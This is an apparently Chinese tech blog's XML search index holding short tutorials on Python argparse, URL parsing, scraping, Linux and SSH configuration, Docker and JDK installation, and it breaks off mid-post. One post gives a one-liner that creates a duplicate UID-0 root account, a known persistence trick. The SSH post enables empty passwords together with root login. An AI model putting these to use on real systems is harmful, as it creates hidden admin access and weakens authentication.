<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>python学习-参数设置</title>
      <link href="/post/a6a2.html"/>
      <url>/post/a6a2.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、命令行参数"><a href="#一、命令行参数" class="headerlink" title="一、命令行参数"></a>一、命令行参数</h3><p>python利用内置的argparse模块来帮助处理命令行参数，例子如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">import</span> argparse<span class="token comment"># 创建参数解析对象</span>parser <span class="token operator">=</span> argparse.ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'命令行设置例子'</span><span class="token punctuation">)</span><span class="token comment"># 添加参数</span>parser.add_argument<span class="token punctuation">(</span><span class="token string">'name'</span>, <span class="token assign-left variable">type</span><span class="token operator">=</span>str, <span class="token assign-left variable">help</span><span class="token operator">=</span><span class="token string">'姓名参数'</span><span class="token punctuation">)</span>parser.add_argument<span class="token punctuation">(</span><span class="token string">'-a'</span>, <span class="token string">'--age'</span>, <span class="token assign-left variable">type</span><span class="token operator">=</span>int, <span class="token assign-left variable">help</span><span class="token operator">=</span><span class="token string">'年龄参数'</span><span class="token punctuation">)</span><span class="token comment"># 解析命令行参数</span>args <span class="token operator">=</span> parser.parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 使用参数</span>print<span class="token punctuation">(</span><span class="token string">"姓名:"</span>, args.name<span class="token punctuation">)</span>print<span class="token punctuation">(</span><span class="token string">"年龄:"</span>, args.age<span class="token punctuation">)</span><span class="token comment"># 常见命令参数</span>字符串参数（String Arguments）：可以简写为 <span class="token parameter variable">-s</span> 或 --string。整数参数（Integer Arguments）：可以简写为 <span class="token parameter variable">-i</span> 或 --integer。浮点数参数（Float Arguments）：可以简写为 <span class="token parameter variable">-f</span> 或 --float。布尔参数（Boolean Arguments）：可以简写为 <span class="token parameter variable">-b</span> 或 --bool。列表参数（List Arguments）：可以简写为 <span class="token parameter variable">-l</span> 或 --list。文件路径参数（File Path Arguments）：可以简写为 <span class="token parameter variable">-p</span> 或 --path。目录路径参数（Directory Path Arguments）：可以简写为 <span class="token parameter variable">-d</span> 或 --dir。枚举参数（Enumerated Arguments）：可以简写为 <span class="token parameter variable">-e</span> 或 --enum。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python学习-分离URL部分</title>
      <link href="/post/dcc1.html"/>
      <url>/post/dcc1.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、完整分离url部分"><a href="#一、完整分离url部分" class="headerlink" title="一、完整分离url部分"></a>一、完整分离url部分</h3><p>使用python中的模块将url解析成ParseResult对象，通过对象的属性获取各个部分的值</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 使用下面模块将url转化为对象</span>from urllib.parse <span class="token function">import</span> urlparseurl <span class="token operator">=</span> <span class="token string">"https://www.example.com/admin/page?query=string#fragment"</span>parsed_url <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span>  <span class="token comment"># 将url解析成对象</span>scheme <span class="token operator">=</span> parsed_url.scheme  <span class="token comment"># 获取协议</span>netloc <span class="token operator">=</span> parsed_url.netloc  <span class="token comment"># 获取域名</span>path <span class="token operator">=</span> parsed_url.path  <span class="token comment"># 获取路径</span>params <span class="token operator">=</span> parsed_url.params  <span class="token comment"># 参数</span>query <span class="token operator">=</span> parsed_url.query  <span class="token comment"># 查询字符串</span>fragment <span class="token operator">=</span> parsed_url.fragment  <span class="token comment"># 锚点</span>print<span class="token punctuation">(</span><span class="token string">"Scheme:"</span>, scheme<span class="token punctuation">)</span>print<span class="token punctuation">(</span><span class="token string">"Netloc:"</span>, netloc<span class="token punctuation">)</span>print<span class="token punctuation">(</span><span class="token string">"Path:"</span>, path<span class="token punctuation">)</span>print<span class="token punctuation">(</span><span class="token string">"Params:"</span>, params<span class="token punctuation">)</span>print<span class="token punctuation">(</span><span class="token string">"Query:"</span>, query<span class="token punctuation">)</span>print<span class="token punctuation">(</span><span class="token string">"Fragment:"</span>, fragment<span class="token punctuation">)</span><span class="token comment">### 输出内容为</span>Scheme: httpsNetloc: www.example.comPath: /admin/pageParams: Query: <span class="token assign-left variable">query</span><span class="token operator">=</span>stringFragment: fragment<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> url分离 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux网卡配置</title>
      <link href="/post/564b.html"/>
      <url>/post/564b.html</url>
      
        <content type="html"><![CDATA[<p>1 找到&#x2F;etc&#x2F;network 文件</p><p>2 修改vi interfaces 文件</p><p>3 内容添加</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">### 设置动态ip</span>// 网卡IP地址配置的是否正确是两台服务器是否可以相互通信的前提。填写对应网卡auto eth0// 动态分配则加上iface eth0 inet dhcp<span class="token comment">### 设置静态ip</span>auto wlan0iface wlan0 inet staticaddress <span class="token number">192.168</span>.1.100  // IP地址netmask <span class="token number">255.255</span>.255.0  // 子网掩码gateway <span class="token number">192.168</span>.1.1    // 网关<span class="token comment">#### 下面可以忽略</span>wpa-ssid your-ssid     // SSID名称wpa-psk your-password // 密码（使用WPA/2 PSK加密）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4  最后重新启动配置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl restart networking<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5 重新启动还是失败，使用下面命令开启对应网卡</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ifup <span class="token operator">-</span>v eth0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 网卡 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python学习-爬取网页数据</title>
      <link href="/post/2110.html"/>
      <url>/post/2110.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、find-x2F-find-all-方法爬取数据"><a href="#一、find-x2F-find-all-方法爬取数据" class="headerlink" title="一、find()&#x2F;find_all()方法爬取数据"></a>一、find()&#x2F;find_all()方法爬取数据</h3><p>利用find方法爬取数据需要使用第三方库beautifulsoup来解析HTML文档并提取数据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#### find()/find_all()方法之间的区别</span>find<span class="token punctuation">(</span><span class="token punctuation">)</span>: 返回符合条件查找的第一个标签find_all<span class="token punctuation">(</span><span class="token punctuation">)</span>: 返回所有符合条件的标签    //一般用来批量输出网页中的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>代码例子</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">from bs4 <span class="token function">import</span> BeautifulSoup<span class="token comment"># 假设html_content是一个包含HTML数据的字符串</span>html_content <span class="token operator">=</span> <span class="token string">''</span>'<span class="token operator">&lt;</span>html<span class="token operator">></span>    <span class="token operator">&lt;</span>body<span class="token operator">></span>        <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"container"</span><span class="token operator">></span>            <span class="token operator">&lt;</span>h1 <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"title"</span><span class="token operator">></span>Hello, World<span class="token operator">!</span><span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">1</span>></span>            <span class="token operator">&lt;</span>p<span class="token operator">></span>This is a sample paragraph.<span class="token operator">&lt;</span>/p<span class="token operator">></span>            <span class="token operator">&lt;</span>a <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"https://example.com"</span> <span class="token assign-left variable">target</span><span class="token operator">=</span><span class="token string">"_blank"</span><span class="token operator">></span>Visit Example<span class="token operator">&lt;</span>/a<span class="token operator">></span>        <span class="token operator">&lt;</span>/div<span class="token operator">></span>    <span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span><span class="token string">''</span>'<span class="token comment"># 创建BeautifulSoup对象并指定解析器</span>soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>html_content, <span class="token string">'html.parser'</span><span class="token punctuation">)</span><span class="token comment"># 使用find方法查找第一个指定的标签</span>a_tag <span class="token operator">=</span> soup.find<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment"># 获取a标签的href属性值</span>href <span class="token operator">=</span> a_tag<span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span>print<span class="token punctuation">(</span>href<span class="token punctuation">)</span>  <span class="token comment"># 输出：https://example.com</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-查找指定标签"><a href="#1-查找指定标签" class="headerlink" title="1 查找指定标签"></a>1 查找指定标签</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tag <span class="token operator">=</span> soup.find<span class="token punctuation">(</span><span class="token string">'标签名'</span><span class="token punctuation">)</span>   //查找对应标签的数据tag <span class="token operator">=</span> soup.find<span class="token punctuation">(</span><span class="token string">'标签名'</span>, <span class="token punctuation">&#123;</span><span class="token string">'属性'</span><span class="token builtin class-name">:</span> <span class="token string">'属性值'</span><span class="token punctuation">&#125;</span>  //查找符合条件的标签例子：soup.find<span class="token punctuation">(</span><span class="token string">'a'</span>, <span class="token punctuation">&#123;</span><span class="token string">'id'</span><span class="token builtin class-name">:</span> <span class="token string">'gug'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>   //查找符合条件属性id<span class="token operator">=</span>gug的a标签<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="2-返回标签中的属性值"><a href="#2-返回标签中的属性值" class="headerlink" title="2 返回标签中的属性值"></a>2 返回标签中的属性值</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 查找到对应标签后href <span class="token operator">=</span> tag<span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span>     // 获取标签href属性的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="3-获取标签中的文本内容"><a href="#3-获取标签中的文本内容" class="headerlink" title="3 获取标签中的文本内容"></a>3 获取标签中的文本内容</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 查找到对应标签后text <span class="token operator">=</span> tag.text<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows常用运行指令</title>
      <link href="/post/7e18.html"/>
      <url>/post/7e18.html</url>
      
        <content type="html"><![CDATA[<h4 id="Windows二十个常用运行指令"><a href="#Windows二十个常用运行指令" class="headerlink" title="Windows二十个常用运行指令"></a>Windows二十个常用运行指令</h4><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">winver        //查看Windows版本mstsc//远程桌面连接calc//打开计算器appwiz.cpl//打开程序和功能cleanmgr//打开磁盘清理工具cmd//打开cmd命令control//打开控制面板mspaint//打开画图面板osk//打开屏幕键盘regedit.exe//打开注册表编辑器wf.msc//打开高级安全Windows Defender防火墙taskschd.msc//打开任务计划程序wscript//打开Windows脚本宿主设置sysdm.cpl//打开系统属性snippingtool//打开截图工具slui//查看系统激活信息notepad//打开记事本mmc//打开控制台compmgmt.msc//打开计算机管理inetcol.cpl//打开internet属性<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令 </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux实用命令</title>
      <link href="/post/ca0f.html"/>
      <url>/post/ca0f.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、命令-Screen"><a href="#一、命令-Screen" class="headerlink" title="一、命令-Screen"></a>一、命令-Screen</h3><h4 id="1-介绍："><a href="#1-介绍：" class="headerlink" title="1.介绍："></a>1.介绍：</h4><p>Screen 是一个全屏窗口管理器，它可以在多个进程之间多路复用一个物理终端。Screen 中有会话的概念，用户可以在一个会话中创建多个 screen 窗口，在每一个 screen 窗口中就像操作一个真实的 telent&#x2F;<a href="https://so.csdn.net/so/search?q=SSH&spm=1001.2101.3001.7020">SSH</a> 连接窗口那样。通俗的讲，screen 命令用于新建一个或多个“命令行窗口”在新建的这些“窗口”中，可以执行命令并且这些“窗口”都是独立并行的。</p><h4 id="2-命令使用"><a href="#2-命令使用" class="headerlink" title="2.命令使用"></a>2.命令使用</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">screen</span> <span class="token parameter variable">-S</span> 会话名称 <span class="token comment">#创建会话，并默认进入会话</span><span class="token function">screen</span> <span class="token parameter variable">-dms</span> 会话名称 <span class="token comment">#创建会话，但不进入会话</span><span class="token function">screen</span> <span class="token parameter variable">-ls</span>     <span class="token comment">#查看会话列表</span><span class="token function">screen</span> <span class="token parameter variable">-d</span> 会话名  <span class="token comment">#指定会话离线</span><span class="token function">screen</span> <span class="token parameter variable">-r</span> 会话名  <span class="token comment">#回复离线的会话</span><span class="token function">screen</span> <span class="token parameter variable">-X</span> <span class="token parameter variable">-S</span> 会话名 quit   <span class="token comment">#不在会话中，强制关闭会话</span><span class="token builtin class-name">exit</span><span class="token comment">#在会话中，退出当前会话并结束会话</span><span class="token function">screen</span> <span class="token parameter variable">-wipe</span><span class="token comment">#检查目前的会话状态，删除没有使用的会话</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="二、命令-创建root账户"><a href="#二、命令-创建root账户" class="headerlink" title="二、命令-创建root账户"></a>二、命令-创建root账户</h3><h4 id="1-普通创建流程"><a href="#1-普通创建流程" class="headerlink" title="1.普通创建流程"></a>1.普通创建流程</h4><p>1.1添加用户</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">adduser liduan //添加一个名为liduan的用户passwd tommy //修改密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/ca0f/2-1.jpg" class><p>1.2赋予用户root权限</p><p><strong>方法一：</strong></p><p>（1） 修改 &#x2F;etc&#x2F;sudoers 文件，添加下面的内容，把前面的注释（#）去掉</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token title important"><span class="token punctuation">##</span> Allows people in group wheel to run all commands</span> %wheel ALL=(ALL) ALL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（2） 修改用户，使其属于root组（wheel），命令如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">usermod -g root liduan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/ca0f/2-2.jpg" class><p><strong>方法二：</strong></p><p>（1） 直接修改 &#x2F;etc&#x2F;sudoers 文件，找到下面一行，在root下面添加一行</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token title important"><span class="token punctuation">##</span> Allow root to run any commands anywhere</span>   root ALL=(ALL) ALL   liduan ALL=(ALL) ALL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="2-一句话创建root账户"><a href="#2-一句话创建root账户" class="headerlink" title="2.一句话创建root账户"></a>2.一句话创建root账户</h4><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">useradd -p "passwd" username -o -u 0 -g root<span class="token title important"><span class="token punctuation">#</span> 参数说明</span>-p　　指定密码-u　　指定UID-g　　指定用户组-o　　一般情况下除了root的uid为0，其他的用户不可以为0，所以需要-o来强制<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh文件配置</title>
      <link href="/post/a8d6.html"/>
      <url>/post/a8d6.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、ssh配置文件"><a href="#一、ssh配置文件" class="headerlink" title="一、ssh配置文件"></a>一、ssh配置文件</h3><p>1.设置ssh服务开机自启</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl <span class="token builtin class-name">enable</span> sshdsystemctl status sshd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/a8d6/1.png" class><p>2.配置允许root用户登录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/ssh/sshd_config<span class="token comment">## 找到设置内容，并进行修改</span>PermitEmptyPasswords <span class="token function">yes</span>   <span class="token comment">#允许密码为空</span>PermitRootLogin <span class="token function">yes</span>   <span class="token comment">#允许root用户登录</span>PasswordAuthentication <span class="token function">yes</span> <span class="token comment">#密码登录开启</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/post/a8d6/2.png" class><p>3.其它一些重要配置（可修改）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Port    <span class="token number">9527</span> <span class="token comment">#生产建议修改,默认22端口  </span> ListenAddress <span class="token function">ip</span><span class="token comment">#监听地址设置SSHD服务器绑定的IP 地址，0.0.0.0 表示侦听所有地址安全建议：如果主机不需要从公网ssh访问，可以把监听地址改为内网地址 这个值可以写成本地IP地址，也可以写成所有地址，即0.0.0.0 表示所有IP。</span> LoginGraceTime 2m<span class="token comment">#用来设定如果用户登录失败，在切断连接前服务器需要等待的时间，单位为秒</span>  StrictModes <span class="token function">yes</span>   <span class="token comment">#检查.ssh/文件的所有者，权限等</span> MaxAuthTries <span class="token comment">#用来设置最大失败尝试登陆次数为6</span>  MaxSessions  <span class="token number">10</span>         <span class="token comment">#同一个连接最大会话</span>PubkeyAuthentication <span class="token function">yes</span>     <span class="token comment">#基于key验证</span> PermitEmptyPasswords no      <span class="token comment">#密码验证当然是需要的！所以这里写 yes，也可以设置为 no，在真实的生产服务器上，根据不同安全级别要求，有的是设置不需要密码登陆的，通过认证的秘钥来登陆。</span>  PasswordAuthentication <span class="token function">yes</span>   <span class="token comment">#基于用户名和密码连接</span>GatewayPorts noClientAliveInterval <span class="token number">10</span> <span class="token comment">#单位:秒</span>ClientAliveCountMax <span class="token number">3</span> <span class="token comment">#默认3</span>UseDNS <span class="token function">yes</span> <span class="token comment">#提高速度可改为no   内网改为no  禁用反向解析</span>GSSAPIAuthentication <span class="token function">yes</span> <span class="token comment">#提高速度可改为no</span>MaxStartups    <span class="token comment">#未认证连接最大值，默认值10</span>Banner /path/file<span class="token comment">#以下可以限制可登录用户的办法：白名单  黑名单</span>AllowUsers user1 user2 user3@ip（限制主机）DenyUsers user1 user2 user3AllowGroups g1 g2DenyGroups g1 g2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="二、密钥登录"><a href="#二、密钥登录" class="headerlink" title="二、密钥登录"></a>二、密钥登录</h3><p>1.生成密钥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/a8d6/3.png" class><p>2.密钥文件位置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">用户目录下的.ssh文件夹中例如：C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>用户名<span class="token punctuation">\</span>.ssh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/a8d6/4.png" class><p>3.将公钥放到服务端中</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/root/.ssh/authorized_keys<span class="token comment">#这个文件中</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/a8d6/5.png" class><p>4.本地进行ssh连接验证</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> root@vps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/a8d6/6.png" class>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux安装docker</title>
      <link href="/post/f667.html"/>
      <url>/post/f667.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、安装环境"><a href="#一、安装环境" class="headerlink" title="一、安装环境"></a>一、安装环境</h3><ul><li>一个 64 位操作系统。</li><li>一个 Linux 内核版本在 3.10 或更高版本。</li><li>系统需要安装 cgroups 和 aufs 以支持 Docker。</li><li>确保您的 Linux 用户具有对 Docker 的执行权限。</li></ul><h3 id="二、安装步骤"><a href="#二、安装步骤" class="headerlink" title="二、安装步骤"></a>二、安装步骤</h3><p><strong>备注：</strong>最好所有步骤都在root权限下执行</p><h4 id="一）Ubuntu上安装docker"><a href="#一）Ubuntu上安装docker" class="headerlink" title="(一）Ubuntu上安装docker"></a>(一）Ubuntu上安装docker</h4><p>1.安装依赖包</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/f667/2-1.png" class><p>2.添加docker官方的GPG密钥</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/f667/2-2.png" class><p>3.添加docker的稳定仓库</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/f667/3.png" class><p>4.更新apt包，然后下载安装Docker CE</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">apt-get install docker-ce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/f667/4.png" class><p>5.查看是否安装成功以及一些实用的设置</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">systemctl status docker # 查看docker服务的状态systemctl start docker# 启动docker服务systemctl restart docker # 重启docker服务systemctl stop docker# 停止docker服务systemctl enable docker# 设置docker服务开机自启systemctl disable docker # 取消docker开机自启<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/post/f667/5.png" class><p>6.设置国内源，创建或修改 &#x2F;etc&#x2F;docker&#x2F;daemon.json 文件。<strong>注意：</strong>使用官方源对我们而言可能很慢</p><p>Docker中国区官方源：<a href="https://registry.docker-cn.com/">https://registry.docker-cn.com</a></p><p>网易：<a href="http://hub-mirror.c.163.com/">http://hub-mirror.c.163.com</a></p><p>ustc ：<a href="https://docker.mirrors.ustc.edu.cn/">https://docker.mirrors.ustc.edu.cn</a></p><p>中国科技大学：<a href="https://docker.mirrors.ustc.edu.cn/">https://docker.mirrors.ustc.edu.cn</a></p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&#123;    "registry-mirrors": [        "http://hub-mirror.c.163.com",        "https://docker.mirrors.ustc.edu.cn",        "https://registry.docker-cn.com"    ]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/post/f667/6.png" class><ol><li>重启docker，然后查看是否成功</li></ol><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">systemctl restart docker docker info<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/f667/7.png" class><h4 id="二）CentOS上安装docker"><a href="#二）CentOS上安装docker" class="headerlink" title="(二）CentOS上安装docker"></a>(二）CentOS上安装docker</h4><p>1.安装必要的软件包和存储库</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">sudo yum install -y yum-utils device-mapper-persistent-data lvm2sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/f667/3-1.png" class><p>2.安装docker</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">sudo yum install docker-ce docker-ce-cli containerd.io<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/f667/3-2.png" class><p>3.查看docker是否安装成功，同上面Ubuntu安装流程类似</p><img src="/post/f667/2-3.png" class><h3 id="三、安装docker-compose"><a href="#三、安装docker-compose" class="headerlink" title="三、安装docker-compose"></a>三、安装docker-compose</h3><p>1.下载docker-compose二进制文件</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">curl -L "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/f667/8.png" class><p>2.添加执行权限，并查看docker-compose是否安装成功</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">chmod +x /usr/local/bin/docker-composedocker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/f667/9.png" class><p>3.docker-compose的一些简单命令</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">docker-compose ps# 查看当前运行的镜像docker-compose up -d# 后台启动镜像docker-compose bulid# 打包镜像docker-compose config# 查看配置docker-compose pull# 下载镜像docker-compose stop # 停止镜像的运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4.下载vulnhub的靶场</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">git clone https://github.com/vulhub/vulhub.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Debian上安装jdk8</title>
      <link href="/post/39bf.html"/>
      <url>/post/39bf.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、安装流程"><a href="#一、安装流程" class="headerlink" title="一、安装流程"></a>一、安装流程</h3><ol><li>安装失败,出现下面图中的错误。</li></ol><p><strong>原因：</strong>Oracle Java更改了协议，导致<a href="https://so.csdn.net/so/search?q=Debian&spm=1001.2101.3001.7020"><strong>Debian</strong></a>下Java源出现问题，安装时出现错误</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">apt install openjdk<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>jdk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/39bf/1.png" class><ol start="2"><li>下载安装包deb</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">wget https<span class="token punctuation">:</span><span class="token operator">//</span>corretto<span class="token punctuation">.</span>aws<span class="token operator">/</span>downloads<span class="token operator">/</span>latest<span class="token operator">/</span>amazon<span class="token operator">-</span>corretto<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>x64<span class="token operator">-</span>linux<span class="token operator">-</span>jdk<span class="token punctuation">.</span>deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/39bf/2.png" class><ol start="3"><li>安装 java-common 软件包</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">apt<span class="token operator">-</span>get install java<span class="token operator">-</span>common<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/39bf/3.png" class><ol start="4"><li>使用 dpkg –install 安装 deb 文件，并进行验证</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">dpkg <span class="token operator">-</span><span class="token operator">-</span>install amazon<span class="token operator">-</span>corretto<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>x64<span class="token operator">-</span>linux<span class="token operator">-</span>jdk<span class="token punctuation">.</span>debjava <span class="token 